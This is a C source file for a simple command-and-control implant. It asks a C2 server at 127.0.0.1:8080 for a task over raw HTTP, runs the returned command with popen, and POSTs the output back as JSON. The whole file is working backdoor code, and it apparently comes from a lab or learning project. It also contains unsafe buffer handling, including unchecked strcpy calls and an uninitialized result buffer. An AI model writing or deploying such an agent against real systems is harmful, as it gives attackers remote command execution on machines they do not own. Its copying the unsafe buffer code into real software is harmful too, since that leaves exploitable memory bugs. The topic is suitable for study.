#include <stdio.h>
#include <stdlib.h>
#include <string.h>
//for LinuxAPI
#include <unistd.h>
//for network
#include <sys/socket.h> //for sockets
#include <netinet/in.h> //for struct (example: sockaddr_in)
#include <arpa/inet.h> //for special func(inet_pton)

#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 8080

void error_exit(const char* msg) {
    perror(msg);
    exit(EXIT_FAILURE);
}

void get_command_from_c2(char* task, char* command) {
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if(sockfd == -1) {
        error_exit("socket");
        exit(EXIT_FAILURE);
    }

    //filling network struct
    struct sockaddr_in addr_server;
    memset(&addr_server, 0, sizeof(addr_server));
    addr_server.sin_family = AF_INET;
    addr_server.sin_port = htons(SERVER_PORT);
    inet_pton(AF_INET, SERVER_IP, &addr_server.sin_addr);

    if(connect(sockfd, (struct sockaddr*)&addr_server, sizeof(addr_server)) == -1) {
        error_exit("connect");
        close(sockfd);
        exit(EXIT_FAILURE);
    }
    printf("[+] Success connect to c2.\n");

    //build request for c2
    char request[2048] = {0};
    snprintf(request, sizeof(request), "GET /get_task/%s HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n", task); 

    if(send(sockfd, request, sizeof(request), 0) == -1) {
        error_exit("send");
        close(sockfd);
        exit(EXIT_FAILURE);
    } 
    printf("[+] Get request send to c2.\n");

    int count_bytes = read(sockfd, request, sizeof(request));
    if(count_bytes == -1) {
        error_exit("read");
        close(sockfd);
        exit(EXIT_FAILURE);
    }
    printf("[+] Answer from c2:\n %s\n\n", request);
    fflush(stdout);

    //for reliability and rewrite the last character '"'
    request[count_bytes - 1] = '\0';
    
    //parse
    char* temp_command = strstr(request, "\r\n\r\n");
    if(temp_command != NULL) {
        temp_command += 5; //because '"'
    }

    strcpy(command, temp_command); //ВАЖНО!!!
    close(sockfd);
}

void execute_command(char* command, char* result) {
    sleep(1);
    
    FILE* fp;
    char chunk[256];
    
    fp = popen(command, "r");
    if(fp == NULL) {
        error_exit("popen");
        exit(EXIT_FAILURE);
    } 

    char temp_result[4096];
    while(fgets(chunk, sizeof(chunk), fp) != NULL) {
        strncat(temp_result, chunk, sizeof(temp_result) - strlen(temp_result) - 1);
    }

    strcpy(result, temp_result);
    pclose(fp);
}

void set_result_to_c2(char* result) {
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if(sockfd == -1) {
        error_exit("socket");
        exit(EXIT_FAILURE);
    }

    struct sockaddr_in addr_server;
    memset(&addr_server, 0, sizeof(addr_server));
    addr_server.sin_family = AF_INET;
    addr_server.sin_port = htons(SERVER_PORT);
    if(inet_pton(AF_INET, SERVER_IP, &addr_server.sin_addr) == -1) {
        error_exit("inet_pton");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    if(connect(sockfd, (struct sockaddr*)&addr_server, sizeof(addr_server)) == -1) {
        error_exit("connect");
        close(sockfd);
        exit(EXIT_FAILURE);
    }
    printf("[+] Success connect for send answer.\n");
   
    //check '\n'
    if(result[strlen(result) - 1] == '\n') {
        result[strlen(result) - 1] = '\0';
    } 
    char body[1024];
    snprintf(body, sizeof(body), "{\"result\": \"%s\"}", result);
    int body_len = strlen(body);

    char answer[4096];
    snprintf(answer, 
            sizeof(answer), 
            "POST /send_result HTTP/1.1\r\n"
                    "Host: 127.0.0.1\r\n"
                    "Connection: close\r\n"
                    "Content-Type: application/json\r\n"
                    "Content-Length: %d\r\n\r\n"
                    "%s", 
                    body_len,
                    body);
    
    if(send(sockfd, answer, sizeof(answer), 0) == -1) {
        error_exit("send");
        close(sockfd);
        exit(EXIT_FAILURE);
    }
    printf("[+] Send answer to c2.\n");
}

int main() {
    char command[100];
    char result[4096];

    get_command_from_c2("task_2", command);
    execute_command(command, result);
    set_result_to_c2(result);

    return 0;
}
